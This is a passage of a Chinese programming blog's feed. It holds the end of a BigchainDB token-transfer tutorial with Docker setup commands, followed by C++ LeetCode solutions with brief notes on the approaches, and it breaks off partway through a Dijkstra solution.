asset=game_boy_token)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fulfill and send the transaction</span></span><br><span class="line">fulfilled_token_tx = bdb.transactions.fulfill(</span><br><span class="line">    prepared_token_tx,</span><br><span class="line">    private_keys=alice.private_key)</span><br><span class="line">bdb.transactions.send_commit(fulfilled_token_tx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use the tokens</span></span><br><span class="line"><span class="comment"># create the output and inout for the transaction</span></span><br><span class="line">transfer_asset = &#123;<span class="string">&#x27;id&#x27;</span>: fulfilled_token_tx[<span class="string">&#x27;id&#x27;</span>]&#125;</span><br><span class="line">output_index = <span class="number">0</span></span><br><span class="line">output = fulfilled_token_tx[<span class="string">&#x27;outputs&#x27;</span>][output_index]</span><br><span class="line">transfer_input = &#123;<span class="string">&#x27;fulfillment&#x27;</span>: output[<span class="string">&#x27;condition&#x27;</span>][<span class="string">&#x27;details&#x27;</span>],</span><br><span class="line">                  <span class="string">&#x27;fulfills&#x27;</span>: &#123;<span class="string">&#x27;output_index&#x27;</span>: output_index,</span><br><span class="line">                               <span class="string">&#x27;transaction_id&#x27;</span>: transfer_asset[<span class="string">&#x27;id&#x27;</span>]&#125;,</span><br><span class="line">                  <span class="string">&#x27;owners_before&#x27;</span>: output[<span class="string">&#x27;public_keys&#x27;</span>]&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare the transaction and use 3 tokens</span></span><br><span class="line">prepared_transfer_tx = bdb.transactions.prepare(</span><br><span class="line">    operation=<span class="string">&#x27;TRANSFER&#x27;</span>,</span><br><span class="line">    asset=transfer_asset,</span><br><span class="line">    inputs=transfer_input,</span><br><span class="line">    recipients=[([alice.public_key], <span class="number">3</span>), ([bob.public_key], <span class="number">7</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># fulfill and send the transaction</span></span><br><span class="line">fulfilled_transfer_tx = bdb.transactions.fulfill(</span><br><span class="line">    prepared_transfer_tx,</span><br><span class="line">    private_keys=bob.private_key)</span><br><span class="line">sent_transfer_tx = bdb.transactions.send_commit(fulfilled_transfer_tx)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;step1-构建一个BigChainDB节点&quot;&gt;&lt;a href=&quot;#step1-构建一个BigChainDB节点&quot; class=&quot;headerlink&quot; title=&quot;step1. 构建一个BigChainDB节点&quot;&gt;&lt;/a&gt;step1. 构建一个BigChainDB节点&lt;/h2&gt;&lt;h3 id=&quot;使用All-in-One-Docker搭建&quot;&gt;&lt;a href=&quot;#使用All-in-One-Docker搭建&quot; class=&quot;headerlink&quot; title=&quot;使用All-in-One Docker搭建&quot;&gt;&lt;/a&gt;使用All-in-One Docker搭建&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;拉取镜像&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;docker pull bigchaindb/bigchaindb:all-in-one&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;运行&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;docker run \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --detach \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --name bigchaindb \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --publish 9984:9984 \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --publish 9985:9985 \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --publish 27017:27017 \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --publish 26657:26657 \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --volume &lt;span class=&quot;variable&quot;&gt;$HOME&lt;/span&gt;/bigchaindb_docker/mongodb/data/db:/data/db \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --volume &lt;span class=&quot;variable&quot;&gt;$HOME&lt;/span&gt;/bigchaindb_docker/mongodb/data/configdb:/data/configdb \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --volume &lt;span class=&quot;variable&quot;&gt;$HOME&lt;/span&gt;/bigchaindb_docker/tendermint:/tendermint \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  bigchaindb/bigchaindb:all-in-one&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;使用Ansible一键脚本搭建&quot;&gt;&lt;a href=&quot;#使用Ansible一键脚本搭建&quot; class=&quot;headerlink&quot; title=&quot;使用Ansible一键脚本搭建&quot;&gt;&lt;/a&gt;使用Ansible一键脚本搭建&lt;/h3&gt;</summary>
    
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
    <category term="BigChain DB" scheme="https://jingtianer.github.io/home/tags/BigChain-DB/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode-20</title>
    <link href="https://jingtianer.github.io/home/2022/11/28/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9320/"/>
    <id>https://jingtianer.github.io/home/2022/11/28/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9320/</id>
    <published>2022-11-28T03:14:34.000Z</published>
    <updated>2023-02-12T03:09:51.658Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1758-生成交替二进制字符串的最少操作数"><a href="#1758-生成交替二进制字符串的最少操作数" class="headerlink" title="1758. 生成交替二进制字符串的最少操作数"></a><a href="https://leetcode.cn/problems/minimum-changes-to-make-alternating-binary-string/">1758. 生成交替二进制字符串的最少操作数</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minOperations</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">min</span>(<span class="built_in">cal</span>(s, len, <span class="literal">true</span>), <span class="built_in">cal</span>(s, len, <span class="literal">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">cal</span><span class="params">(<span class="type">const</span> string&amp; s, <span class="type">int</span> len, <span class="type">bool</span> flag)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(flag &amp;&amp; s[i] == <span class="string">&#x27;0&#x27;</span> || !flag &amp;&amp; s[i] == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">            flag = !flag;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="813-最大平均值和的分组"><a href="#813-最大平均值和的分组" class="headerlink" title="813. 最大平均值和的分组"></a><a href="https://leetcode.cn/problems/largest-sum-of-averages/">813. 最大平均值和的分组</a></h2><h3 id="超时暴搜"><a href="#超时暴搜" class="headerlink" title="超时暴搜"></a>超时暴搜</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; sum;</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">largestSumOfAverages</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        len = nums.<span class="built_in">size</span>();</span><br><span class="line">        sum = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(len+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= len; i++) &#123;</span><br><span class="line">            sum[i] = nums[i<span class="number">-1</span>] + sum[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">search</span>(nums, k, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">search</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k, <span class="type">int</span> i, <span class="type">int</span> K, <span class="type">double</span> left_value, <span class="type">int</span> last_j)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(k == K || i == len) &#123;</span><br><span class="line">            <span class="keyword">return</span> left_value + (sum[len] - sum[last_j] + <span class="number">0.0</span>) / (len - last_j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(<span class="built_in">search</span>(nums, k, i+<span class="number">1</span>, K+<span class="number">1</span>, left_value + (sum[i] - sum[last_j] + <span class="number">0.0</span>)/(i-last_j), i), <span class="built_in">search</span>(nums, k,i+<span class="number">1</span>, K, left_value, last_j));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">max</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>昨天第一个思路是用排序，找出最大的m个数，这m个数恰好将数组分成k个部分，发现不可行。<br>然后暴力搜索，超时了，暴搜时考虑添加隔板，其中left_value表示当前搜索下标i之前的分组平均值</p></blockquote><h3 id="类似背包"><a href="#类似背包" class="headerlink" title="类似背包"></a>类似背包</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">largestSumOfAverages</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sum</span><span class="params">(len+<span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">double</span>&gt;&gt; <span class="built_in">left_avg</span>(k<span class="number">-1</span>, <span class="built_in">vector</span>&lt;<span class="type">double</span>&gt;(len, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= len; i++) &#123;</span><br><span class="line">            sum[i] = nums[i<span class="number">-1</span>] + sum[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">double</span> maxx = sum[len] / (len + <span class="number">0.0</span>);</span><br><span class="line">        <span class="keyword">if</span>(k &lt;= <span class="number">1</span>) <span class="keyword">return</span> maxx;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">            left_avg[<span class="number">0</span>][i] = <span class="built_in">double</span>(sum[i])/i;</span><br><span class="line">            maxx = <span class="built_in">max</span>(maxx, left_avg[<span class="number">0</span>][i] + <span class="built_in">double</span>(sum[len] - sum[i])/(len-i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; k<span class="number">-2</span>; i++) &#123; <span class="comment">//第几个隔板</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = i+<span class="number">1</span>; j &lt; len; j++) &#123; <span class="comment">// 前一个隔板的位置</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> p = j+<span class="number">1</span>; p &lt; len; p++) &#123; <span class="comment">// 现在隔板的位置</span></span><br><span class="line">                    maxx = <span class="built_in">max</span>(left_avg[i][j] + <span class="built_in">double</span>(sum[p] - sum[j])/(p-j) + <span class="built_in">double</span>(sum[len] - sum[p])/(len-p), maxx);</span><br><span class="line">                    <span class="comment">// left_avg + 当前隔板与上一个隔板的avg， 最后一个数到当前隔板的avg</span></span><br><span class="line">                    left_avg[i+<span class="number">1</span>][p] = <span class="built_in">max</span>(left_avg[i][j] + <span class="built_in">double</span>(sum[p] - sum[j])/(p-j), left_avg[i+<span class="number">1</span>][p]);</span><br><span class="line">                    <span class="comment">// 更新avg</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxx;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>今天考虑用类似背包的想法，结合暴力搜索的left_avg，用$ left_avg[i][j] $ ，表示添加i个隔板，在j之前的最大left_avg<br>从第二个隔板开始，假设第i个隔板分别在位置 $j &#x3D; i+1,i+2,i+3 …$ 时，第 $i+1$个隔板可以在 $p &#x3D; j+1, j+2, …$<br>计算前后两个隔板各种情况的最大值，更新left_avg，更新maxx</p></blockquote><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">largestSumOfAverages</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sum</span><span class="params">(len+<span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= len; i++) &#123;</span><br><span class="line">            sum[i] = nums[i<span class="number">-1</span>] + sum[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(k &lt;= <span class="number">1</span>) <span class="keyword">return</span> sum[len] / (len + <span class="number">0.0</span>);</span><br><span class="line">        vector&lt;vector&lt;<span class="type">double</span>&gt;&gt; <span class="built_in">left_avg</span>(k<span class="number">-1</span>, <span class="built_in">vector</span>&lt;<span class="type">double</span>&gt;(len, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">            left_avg[<span class="number">0</span>][i] = <span class="built_in">double</span>(sum[i])/i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; k<span class="number">-2</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = i+<span class="number">1</span>; j &lt; len<span class="number">-1</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> p = j+<span class="number">1</span>; p &lt; len; p++) &#123;</span><br><span class="line">                    left_avg[i+<span class="number">1</span>][p] = <span class="built_in">max</span>(left_avg[i][j] + <span class="built_in">double</span>(sum[p] - sum[j])/(p-j), left_avg[i+<span class="number">1</span>][p]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">double</span> maxx = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; k<span class="number">-1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">                maxx = <span class="built_in">max</span>(left_avg[i][j]+<span class="built_in">double</span>(sum[len] - sum[j])/(len-j), maxx);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxx;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>减少maxx计算次数</p></blockquote><h2 id="1752-检查数组是否经排序和轮转得到"><a href="#1752-检查数组是否经排序和轮转得到" class="headerlink" title="1752. 检查数组是否经排序和轮转得到"></a><a href="https://leetcode.cn/problems/check-if-array-is-sorted-and-rotated/">1752. 检查数组是否经排序和轮转得到</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">while</span>(i &lt; len &amp;&amp; nums[i<span class="number">-1</span>] &lt;= nums[i]) i++;</span><br><span class="line">        <span class="keyword">if</span>(i == len) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        j = i+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(j &lt; len &amp;&amp; nums[j<span class="number">-1</span>] &lt;= nums[j]) j++;</span><br><span class="line">        <span class="keyword">return</span> j == len &amp;&amp; nums[len<span class="number">-1</span>] &lt;= nums[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="882-细分图中的可到达节点"><a href="#882-细分图中的可到达节点" class="headerlink" title="882. 细分图中的可到达节点"></a><a href="https://leetcode.cn/problems/reachable-nodes-in-subdivided-graph/">882. 细分图中的可到达节点</a></h2><h2 id="暴搜超时"><a href="#暴搜超时" class="headerlink" title="暴搜超时"></a>暴搜超时</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; graph;</span><br><span class="line">    vector&lt;<span class="type">bool</span>&gt; global_visited;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; copy_edges;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">reachableNodes</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; edges, <span class="type">int</span> maxMoves, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> edge_size = edges.<span class="built_in">size</span>();</span><br><span class="line">        graph = vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;(n);</span><br><span class="line">        global_visited = <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(n, <span class="literal">false</span>);</span><br><span class="line">        copy_edges = vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;(<span class="number">2</span>,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(edge_size, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; edge_size; i++) &#123;</span><br><span class="line">            graph[edges[i][<span class="number">0</span>]].<span class="built_in">push_back</span>(i);</span><br><span class="line">            graph[edges[i][<span class="number">1</span>]].<span class="built_in">push_back</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">dfs</span>(std::<span class="built_in">move</span>(edges), <span class="number">0</span>, maxMoves);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; edge_size; i++) &#123;</span><br><span class="line">            res += <span class="built_in">min</span>(edges[i][<span class="number">2</span>], copy_edges[<span class="number">0</span>][i] + copy_edges[<span class="number">1</span>][i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(global_visited[i]) &#123;</span><br><span class="line">                res++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp;&amp; edges, <span class="type">int</span> node, <span class="type">int</span> move)</span> </span>&#123;</span><br><span class="line">        global_visited[node] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(move &lt;= <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> e : graph[node]) &#123;</span><br><span class="line">            <span class="type">int</span> w = edges[e][<span class="number">2</span>];</span><br><span class="line">            <span class="type">int</span> next = edges[e][<span class="number">0</span>] == node ? edges[e][<span class="number">1</span>] : edges[e][<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> direction = edges[e][<span class="number">0</span>] == node ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">            copy_edges[direction][e] = <span class="built_in">max</span>(<span class="built_in">min</span>(w, move), copy_edges[direction][e]);</span><br><span class="line">            <span class="keyword">if</span>(move &gt; w) &#123;</span><br><span class="line">                <span class="built_in">dfs</span>(std::<span class="built_in">move</span>(edges), next, move-w<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="djikstra-题解"><a href="#djikstra-题解" class="headerlink" title="djikstra-题解"></a>djikstra-题解</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">encode</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> v, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> u * n + v;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">reachableNodes</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; edges, <span class="type">int</span> maxMoves, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;&gt; <span class="built_in">adList</span>(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;edge : edges) &#123;</span><br><span class="line">            <span class="type">int</span> u = edge[<span class="number">0</span>], v = edge[<span class="number">1</span>], nodes = edge[<span class="number">2</span>];</span><br><span class="line">            adList[u].<span class="built_in">emplace_back</span>(v, nodes);</span><br><span class="line">            adList[v].<span class="built_in">emplace_back</span>(u, nodes);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; used;</span><br><span class="line">        